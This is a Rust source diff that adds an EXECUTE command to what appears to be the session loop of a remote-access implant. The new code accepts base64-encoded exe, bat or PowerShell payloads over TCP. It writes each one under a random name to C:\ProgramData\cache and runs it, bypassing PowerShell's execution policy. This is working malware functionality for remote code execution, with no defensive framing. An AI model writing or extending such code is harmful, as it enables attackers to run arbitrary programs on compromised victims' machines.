@@ -104,6 +104,30 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut
                     continue;
                 }
 
+                if raw.to_ascii_uppercase().starts_with(text::EXECUTE) {
+                    let rest = raw[text::EXECUTE.len()..].trim();
+                    let (ext, b64) = match rest.split_once(':') {
+                        Some((e, b)) => (e.trim(), b.trim()),
+                        None => {
+                            let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE));
+                            continue;
+                        }
+                    };
+                    let ext_lc = ext.to_ascii_lowercase();
+                    if !matches!(ext_lc.as_str(), "exe" | "bat" | "ps1") || b64.is_empty() {
+                        let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE));
+                        continue;
+                    }
+                    match decode_b64(b64) {
+                        Some(bytes) => match drop_and_run(&bytes, &ext_lc) {
+                            Ok(()) => { let _ = send(stream, &format!("{}{}", text::ACK, text::EXECUTE)); }
+                            Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE)); }
+                        },
+                        None => { let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE)); }
+                    }
+                    continue;
+                }
+
                 let cmd = raw.to_ascii_uppercase();
                 match cmd.as_str() {
                     text::RECONNECT => {
@@ -132,6 +156,30 @@ fn session(stream: &mut TcpStream, ip: &str, fp: &str, host: &str, plugins: &mut
             Err(_) => return false,
         }
     }
+}
+
+fn drop_and_run(bytes: &[u8], ext: &str) -> std::io::Result<()> {
+    use std::{fs, process::Command, time::SystemTime};
+
+    let seed = SystemTime::now()
+        .duration_since(SystemTime::UNIX_EPOCH)
+        .map(|d| d.as_nanos() as u64)
+        .unwrap_or(0)
+        ^ (bytes.len() as u64).wrapping_mul(0x9e37_79b9_7f4a_7c15);
+    let name = format!("{:012x}", seed & 0xffff_ffff_ffff);
+
+    let dir = std::path::Path::new(r"C:\ProgramData\cache");
+    fs::create_dir_all(dir)?;
+    let path = dir.join(format!("{name}.{ext}"));
+    fs::write(&path, bytes)?;
+
+    match ext {
+        "exe" => { Command::new(&path).spawn()?; }
+        "bat" => { Command::new("cmd").args(["/c", path.to_str().unwrap_or("")]).spawn()?; }
+        "ps1" => { Command::new("powershell").args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", path.to_str().unwrap_or("")]).spawn()?; }
+        _ => {}
+    }
+    Ok(())
 }
 
 // Minimal base64 decoder (RFC 4648, no padding requirement)
